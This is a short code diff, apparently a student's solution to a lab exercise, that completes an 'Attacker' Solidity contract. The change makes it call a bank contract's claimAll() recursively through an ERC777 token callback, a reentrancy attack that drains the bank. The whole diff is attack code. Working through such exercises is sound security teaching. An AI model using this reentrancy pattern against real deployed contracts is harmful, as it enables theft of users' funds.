@@ -46,6 +46,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		// });
 		// bank.claimAll();
 		bank.deposit{value: amt}();
+		_recursiveWithdraw();
 	}
 
 	/*
@@ -69,8 +70,19 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-    // event recurse 
+    	// event recurse 
+		_recursiveWithdraw();
 	}
+
+	function _recursiveWithdraw() private {
+        depth++;
+        emit Recurse(depth);
+
+        if (depth < max_depth) {
+            bank.claimAll();
+        }
+        depth--;
+    }
 
 }
 
